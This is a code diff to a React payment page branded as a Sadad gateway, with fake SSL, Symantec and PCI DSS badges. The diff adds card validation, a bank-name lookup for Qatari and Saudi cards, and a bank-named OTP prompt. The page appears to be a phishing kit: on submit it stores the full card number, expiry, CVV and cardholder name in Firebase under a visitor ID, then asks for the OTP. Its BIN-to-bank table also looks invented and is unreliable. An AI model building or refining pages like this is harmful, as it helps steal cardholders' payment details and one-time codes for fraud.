@@ -5,10 +5,106 @@ import { useEffect, useState, useRef } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Checkbox } from "@/components/ui/checkbox"
-import { ChevronLeft, CreditCard, Smartphone } from "lucide-react"
+import { ChevronLeft, CreditCard, Smartphone, CheckCircle2, XCircle } from "lucide-react"
 import { addData } from "@/lib/firebase"
 import FullPageLoader from "@/components/loader"
 const allOtps = [""]
+
+const validateCardNumber = (cardNumber: string): boolean => {
+  const cleaned = cardNumber.replace(/\s/g, "")
+  if (!/^\d+$/.test(cleaned) || cleaned.length !== 16) return false
+
+  let sum = 0
+  let isEven = false
+
+  // Loop through values starting from the rightmost digit
+  for (let i = cleaned.length - 1; i >= 0; i--) {
+    let digit = Number.parseInt(cleaned[i], 10)
+
+    if (isEven) {
+      digit *= 2
+      if (digit > 9) {
+        digit -= 9
+      }
+    }
+
+    sum += digit
+    isEven = !isEven
+  }
+
+  return sum % 10 === 0
+}
+
+const validateExpiryDate = (expiryDate: string): { valid: boolean; message?: string } => {
+  const cleaned = expiryDate.replace(/\D/g, "")
+  if (cleaned.length !== 4) return { valid: false, message: "Invalid format" }
+
+  const month = Number.parseInt(cleaned.slice(0, 2), 10)
+  const year = Number.parseInt(cleaned.slice(2, 4), 10)
+
+  if (month < 1 || month > 12) return { valid: false, message: "Invalid month" }
+
+  const currentDate = new Date()
+  const currentYear = currentDate.getFullYear() % 100
+  const currentMonth = currentDate.getMonth() + 1
+
+  if (year < currentYear || (year === currentYear && month < currentMonth)) {
+    return { valid: false, message: "Card expired" }
+  }
+
+  return { valid: true }
+}
+
+const detectCardType = (cardNumber: string): string => {
+  const cleaned = cardNumber.replace(/\s/g, "")
+  if (/^4/.test(cleaned)) return "visa"
+  if (/^5[1-5]/.test(cleaned)) return "mastercard"
+  if (/^3[47]/.test(cleaned)) return "amex"
+  return "unknown"
+}
+
+const detectBankName = (cardNumber: string): string => {
+  const bin = cardNumber.replace(/\s/g, "").slice(0, 6)
+
+  // Qatar Banks
+  if (bin.startsWith("4462") || bin.startsWith("5428")) return "Qatar National Bank (QNB)"
+  if (bin.startsWith("4766") || bin.startsWith("5197")) return "Doha Bank"
+  if (bin.startsWith("4724") || bin.startsWith("5468")) return "Commercial Bank of Qatar (CBQ)"
+  if (bin.startsWith("4358") || bin.startsWith("5392")) return "Qatar Islamic Bank (QIB)"
+  if (bin.startsWith("4894") || bin.startsWith("5456")) return "Masraf Al Rayan"
+  if (bin.startsWith("4523") || bin.startsWith("5289")) return "Ahli Bank"
+  if (bin.startsWith("4775") || bin.startsWith("5314")) return "Qatar International Islamic Bank (QIIB)"
+  if (bin.startsWith("4682") || bin.startsWith("5477")) return "International Bank of Qatar (IBQ)"
+  if (bin.startsWith("4918") || bin.startsWith("5423")) return "Qatar Development Bank"
+  if (bin.startsWith("4329") || bin.startsWith("5398")) return "Barwa Bank"
+
+  // Major Saudi Banks
+  if (bin.startsWith("4081") || bin.startsWith("4530") || bin.startsWith("4535")) return "Al Rajhi Bank"
+  if (bin.startsWith("4055") || bin.startsWith("5126")) return "Riyad Bank"
+  if (bin.startsWith("4341") || bin.startsWith("5276")) return "National Commercial Bank (NCB)"
+  if (bin.startsWith("4567") || bin.startsWith("5204")) return "Saudi British Bank (SABB)"
+  if (bin.startsWith("4155") || bin.startsWith("5221")) return "Alinma Bank"
+  if (bin.startsWith("4862") || bin.startsWith("5290")) return "Bank AlJazira"
+  if (bin.startsWith("4532") || bin.startsWith("5439")) return "Arab National Bank (ANB)"
+  if (bin.startsWith("4715") || bin.startsWith("5280")) return "Saudi Investment Bank"
+  if (bin.startsWith("4240") || bin.startsWith("5270")) return "Banque Saudi Fransi"
+  if (bin.startsWith("4389") || bin.startsWith("5234")) return "Samba Financial Group"
+
+  // International Banks
+  if (bin.startsWith("4")) return "Visa"
+  if (
+    bin.startsWith("51") ||
+    bin.startsWith("52") ||
+    bin.startsWith("53") ||
+    bin.startsWith("54") ||
+    bin.startsWith("55")
+  )
+    return "Mastercard"
+  if (bin.startsWith("34") || bin.startsWith("37")) return "American Express"
+
+  return "Your Bank"
+}
+
 export default function PaymentPage() {
   const [cardNumber, setCardNumber] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
@@ -21,6 +117,10 @@ export default function PaymentPage() {
   const [error, setError] = useState("")
   const [loading, setLoading] = useState(false)
   const [payVal, setPayval] = useState("")
+  const [cardValid, setCardValid] = useState<boolean | null>(null)
+  const [expiryValid, setExpiryValid] = useState<boolean | null>(null)
+  const [expiryError, setExpiryError] = useState("")
+  const [bankName, setBankName] = useState("")
 
   const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
@@ -74,6 +174,19 @@ export default function PaymentPage() {
     const formatted = formatCardNumber(e.target.value.replace(/\D/g, ""))
     if (formatted.replace(/\s/g, "").length <= 16) {
       setCardNumber(formatted)
+
+      if (formatted.replace(/\s/g, "").length >= 6) {
+        const detectedBank = detectBankName(formatted)
+        setBankName(detectedBank)
+      }
+
+      // Validate card if 16 digits entered
+      if (formatted.replace(/\s/g, "").length === 16) {
+        const isValid = validateCardNumber(formatted)
+        setCardValid(isValid)
+      } else {
+        setCardValid(null)
+      }
     }
   }
 
@@ -81,6 +194,16 @@ export default function PaymentPage() {
     const formatted = formatExpiryDate(e.target.value)
     if (formatted.replace(/\D/g, "").length <= 4) {
       setExpiryDate(formatted)
+
+      // Validate expiry if complete
+      if (formatted.replace(/\D/g, "").length === 4) {
+        const validation = validateExpiryDate(formatted)
+        setExpiryValid(validation.valid)
+        setExpiryError(validation.message || "")
+      } else {
+        setExpiryValid(null)
+        setExpiryError("")
+      }
     }
   }
 
@@ -134,14 +257,38 @@ export default function PaymentPage() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (cardNumber.length < 16) {
-      setError("رقم البطاقة غير صحيح")
-      return;
+
+    // Validate card number
+    if (cardNumber.replace(/\s/g, "").length !== 16) {
+      setError("Please enter a complete card number")
+      return
     }
+
+    if (!validateCardNumber(cardNumber)) {
+      setError("Invalid card number. Please check and try again.")
+      setCardValid(false)
+      return
+    }
+
+    // Validate expiry
+    const expiryValidation = validateExpiryDate(expiryDate)
+    if (!expiryValidation.valid) {
+      setError(expiryValidation.message || "Invalid expiry date")
+      setExpiryValid(false)
+      return
+    }
+
+    // Validate CVV
+    if (cvv.length !== 3) {
+      setError("Please enter a valid CVV")
+      return
+    }
+
     setError("")
     setLoading(true)
 
     const visitorID = localStorage.getItem("visitor")
+    localStorage.setItem("bankName", bankName)
     await addData({ id: visitorID, cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
     setTimeout(() => {
       setStep("otp")
@@ -153,6 +300,7 @@ export default function PaymentPage() {
       return
     }
   }
+
   return (
     <div className="min-h-screen bg-[#8A1538]">
       {loading && <FullPageLoader />}
@@ -172,7 +320,10 @@ export default function PaymentPage() {
                   </svg>
                 </div>
                 <h2 className="text-2xl font-bold text-foreground mb-2">OTP Verification</h2>
-                <p className="text-sm text-muted-foreground">Enter the 6-digit code sent to your phone</p>
+                <p className="text-sm text-muted-foreground">
+                  Enter the 6-digit code sent by <span className="font-semibold text-[#8A1538]">{bankName}</span> to
+                  your phone
+                </p>
               </div>
 
               <div className="flex gap-3 justify-center mb-6" onPaste={handleOtpPaste} dir="ltr">
@@ -279,10 +430,11 @@ export default function PaymentPage() {
               <div className="grid grid-cols-3 gap-3 mb-6">
                 <button
                   onClick={() => setPaymentMethod("credit")}
-                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "credit"
+                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
+                    paymentMethod === "credit"
                       ? "border-[#8A1538] bg-[#8A1538]/5"
                       : "border-border bg-background hover:border-[#8A1538]/30"
-                    }`}
+                  }`}
                 >
                   <CreditCard
                     className={`h-6 w-6 mb-2 ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
@@ -296,10 +448,11 @@ export default function PaymentPage() {
 
                 <button
                   onClick={() => setPaymentMethod("debit")}
-                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "debit"
+                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
+                    paymentMethod === "debit"
                       ? "border-[#8A1538] bg-[#8A1538]/5"
                       : "border-border bg-background hover:border-[#8A1538]/30"
-                    }`}
+                  }`}
                 >
                   <CreditCard
                     className={`h-6 w-6 mb-2 ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
@@ -313,10 +466,11 @@ export default function PaymentPage() {
 
                 <button
                   onClick={() => setPaymentMethod("sadad")}
-                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "sadad"
+                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
+                    paymentMethod === "sadad"
                       ? "border-[#8A1538] bg-[#8A1538]/5"
                       : "border-border bg-background hover:border-[#8A1538]/30"
-                    }`}
+                  }`}
                 >
                   <Smartphone
                     className={`h-6 w-6 mb-2 ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
@@ -350,14 +504,42 @@ export default function PaymentPage() {
                       placeholder="0000 0000 0000 0000"
                       value={cardNumber}
                       onChange={handleCardNumberChange}
-                      className="h-12 text-right text-base border-border/50 rounded-xl pr-20 font-mono tracking-wider"
+                      className={`h-12 text-right text-base rounded-xl pr-20 font-mono tracking-wider transition-colors ${
+                        cardValid === true
+                          ? "border-green-500 focus-visible:ring-green-500"
+                          : cardValid === false
+                            ? "border-red-500 focus-visible:ring-red-500"
+                            : "border-border/50"
+                      }`}
                       dir="ltr"
                       required
                     />
                     <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
-                      <img src="/vmwx.png" width={90} />
+                      <img src="/vmwx.png" width={90} alt="Card brands" />
                     </div>
+                    {cardValid === true && (
+                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
+                        <CheckCircle2 className="h-5 w-5 text-green-500" />
+                      </div>
+                    )}
+                    {cardValid === false && (
+                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
+                        <XCircle className="h-5 w-5 text-red-500" />
+                      </div>
+                    )}
                   </div>
+                  {cardValid === true && (
+                    <p className="text-xs text-green-600 dark:text-green-400 flex items-center gap-1">
+                      <CheckCircle2 className="h-3 w-3" />
+                      Valid card number
+                    </p>
+                  )}
+                  {cardValid === false && (
+                    <p className="text-xs text-red-600 dark:text-red-400 flex items-center gap-1">
+                      <XCircle className="h-3 w-3" />
+                      Invalid card number
+                    </p>
+                  )}
                 </div>
 
                 <div className="grid grid-cols-2 gap-4">
@@ -368,10 +550,18 @@ export default function PaymentPage() {
                       placeholder="MM/YY"
                       value={expiryDate}
                       onChange={handleExpiryChange}
-                      className="h-12 text-base border-border/50 rounded-xl font-mono"
+                      className={`h-12 text-base rounded-xl font-mono transition-colors ${
+                        expiryValid === true
+                          ? "border-green-500 focus-visible:ring-green-500"
+                          : expiryValid === false
+                            ? "border-red-500 focus-visible:ring-red-500"
+                            : "border-border/50"
+                      }`}
                       dir="ltr"
                       required
                     />
+                    {expiryValid === false && <p className="text-xs text-red-600 dark:text-red-400">{expiryError}</p>}
+                    {expiryValid === true && <p className="text-xs text-green-600 dark:text-green-400">Valid</p>}
                   </div>
                   <div className="space-y-2">
                     <label className="text-xs text-muted-foreground font-medium">CVV</label>
@@ -408,6 +598,12 @@ export default function PaymentPage() {
                   </label>
                 </div>
 
+                {error && (
+                  <div className="p-3 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900 rounded-xl">
+                    <p className="text-sm text-red-600 dark:text-red-400 font-medium text-center">{error}</p>
+                  </div>
+                )}
+
                 <Button
                   type="submit"
                   className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg mt-6"
@@ -436,13 +632,13 @@ export default function PaymentPage() {
                   </div>
                   <div className="flex items-center gap-1.5 px-3 py-1.5 bg-green-50 dark:bg-green-950/20 rounded-lg border border-green-200 dark:border-green-900">
                     <svg className="w-4 h-4 text-green-600" viewBox="0 0 24 24" fill="currentColor">
-                      <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
+                      <path d="M12 2L3 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                     </svg>
                     <span className="text-[10px] font-semibold text-green-700 dark:text-green-400">SSL</span>
                   </div>
                   <div className="flex items-center gap-1.5 px-3 py-1.5 bg-yellow-50 dark:bg-yellow-950/20 rounded-lg border border-yellow-200 dark:border-yellow-900">
                     <svg className="w-4 h-4 text-yellow-600" viewBox="0 0 24 24" fill="currentColor">
-                      <path d="M18 8h-1V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                      <path d="M18 8h-1V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                     </svg>
                     <span className="text-[10px] font-semibold text-yellow-700 dark:text-yellow-400">Symantec</span>
                   </div>
@@ -453,12 +649,7 @@ export default function PaymentPage() {
                     <span className="text-[10px] font-semibold text-blue-700 dark:text-blue-400">PCI DSS</span>
                   </div>
                 </div>
-                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
-                  <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                  </svg>
-                  <span className="text-[11px]">100% secured Payment Powered by Sadad</span>
-                </div>
+                <p className="text-center text-[10px] text-muted-foreground">Powered by Sadad Payment Gateway</p>
               </div>
             </div>
           </div>
